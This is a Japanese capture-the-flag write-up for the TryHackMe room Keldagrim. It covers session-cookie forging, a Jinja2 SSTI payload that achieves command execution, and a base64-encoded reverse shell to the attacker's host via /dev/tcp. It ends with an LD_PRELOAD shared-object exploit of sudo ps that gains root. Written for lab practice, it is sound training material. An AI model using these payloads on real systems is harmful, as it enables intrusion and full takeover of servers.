# Keldagrim CTF

https://tryhackme.com/room/keldagrim

## Enumeration

```shell
TARGET=10.49.128.163
sudo bash -c "echo $TARGET   keldagrim.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/3.0.6 Python/3.8.10
```

SSH, HTTPのみ。

```sh
root@ip-10-49-122-116:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.128.163
+ Target Hostname:    keldagrim.thm
+ Target Port:        80
+ Start Time:         2025-11-29 00:11:10 (GMT0)
---------------------------------------------------------------------------
+ Server: Werkzeug/3.0.6 Python/3.8.10
+ Cookie session created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, GET, HEAD 
+ 1707 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-11-29 00:11:20 (GMT0) (10 seconds)
---------------------------------------------------------------------------
```

XSSを念頭に。

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.49.128.163/ ----
+ http://10.49.128.163/admin (CODE:200|SIZE:2634)                                                                         
+ http://10.49.128.163/services (CODE:500|SIZE:265)                                                                       
+ http://10.49.128.163/team (CODE:500|SIZE:265)                                                                           
+ http://10.49.128.163/wow (CODE:500|SIZE:265)                                                                            
                                                                                                                          
-----------------
```

トップページにアクセスすると、セッションクッキーがセットされる。

```http
Set-Cookie: session=WjNWbGMzUT0=; Path=/
```

これを2回Base64デコードすると、guest になる。

/team で2人のメンバーを確認。

- Jed - team leader
- Jad - online operator

ユーザーリストからセッションIDリストを作る。

```sh
$ cat ./users.txt             
jed
Jed
jad
Jad
admin
Admin
JED
JAD
ADMIN

$ while IFS= read -r line; do echo -n "$line" | base64 -w0 | base64; done < users.txt > b64_users.txt
```

/admin ページでファジングしたが空振り。

```sh
ffuf -u http://keldagrim.thm/admin -w ./b64_users.txt -H 'Cookie: session=FUZZ' -fr 'Welcome to Keldagrim Forge!'
```

１万件以上の名前リストも使ってファジングしたが空振り。

```sh
while IFS= read -r line; do echo -n "$line" | base64 -w0 | base64; done < /usr/share/wordlists/seclists/Usernames/Names/names.txt > b64_big.txt

ffuf -u http://keldagrim.thm/admin -w ./b64_big.txt -H 'Cookie: session=FUZZ' -fr 'Here at the forge we'
```

Base64でもない適当な文字列をセットすると内部サーバーエラーになるが、１回だけエンコードした文字列をセットするとサーバーエラーにならないことに気づいた。

admin を１回だけエンコードした `YWRtaW4=` で/adminを表示できた。すこし納得いかない・・・

```sh
$ while IFS= read -r line; do echo -n "$line" | base64; done < users.txt > b64_once_users.txt

$ ffuf -u http://keldagrim.thm/admin -w ./b64_once_users.txt -H 'Cookie: session=FUZZ' -fs 2619

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://keldagrim.thm/admin
 :: Wordlist         : FUZZ: /home/kali/ctf/kelda/b64_once_users.txt
 :: Header           : Cookie: session=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2619
________________________________________________

YWRtaW4=                [Status: 200, Size: 1748, Words: 295, Lines: 59, Duration: 158ms]
:: Progress: [9/9] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

## /admin

下記が表示されている。

```
Current user - $2,165
```

### SQLi

下記のようなSQLが実行されていると想像してSQLインジェクションを探ったが成功する気配が無い。

```sql
select name,current from account where username=<admin>
```

### SSTI

sales というCookieが追加されていたことに気づいた。`SkRJc01UWTE=` を２回Base64デコードしたら`$2,165` だった。

`{{7*'7'}}` を１回だけBase64エンコードしたものをセットすると、 `Current user - 7777777`と表示された。Jinja2 の SSTI が成立する。

次のペイロードでコマンド実行できることを確認。

```python
{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("id")["read"]() }}
```

```sh
urrent user - uid=1000(jed) gid=1000(jed) groups=1000(jed)
```

リバースシェル取得成功。

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM4LjIzNi84ODg4IDA+JjE=|base64 -d|bash').read()}}
```

```sh
$ nc -nlvp 8888           
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.49.128.163] 38076
bash: cannot set terminal process group (770): Inappropriate ioctl for device
bash: no job control in this shell
jed@ip-10-49-128-163:~/app$ id
id
uid=1000(jed) gid=1000(jed) groups=1000(jed)
```

## 権限昇格

ps を root として実行できるが・・・？

```sh
jed@ip-10-48-185-85:~$ sudo -l
Matching Defaults entries for jed on ip-10-48-185-85:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User jed may run the following commands on ip-10-48-185-85:
    (ALL : ALL) NOPASSWD: /bin/ps
```

env_keep+=LD_PRELOAD もついていた。

x.c を作成

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash -p");
}
```

昇格成功

```sh
jed@ip-10-48-185-85:~$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
x.c: In function ‘hijack’:
x.c:8:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    8 |         setgid(0);
      |         ^~~~~~
x.c:9:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    9 |         setuid(0);
      |         ^~~~~~

jed@ip-10-48-185-85:~$ sudo LD_PRELOAD=/tmp/x.so /bin/ps
root@ip-10-48-185-85:/home/jed# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- salesクッキーが追加されていたことになかなか気づけなかった。
- LD_PRELOAD が付いていたことになかなか気づけなかった。

## Tags

#tags:SSTI #tags:LD_PRELOAD
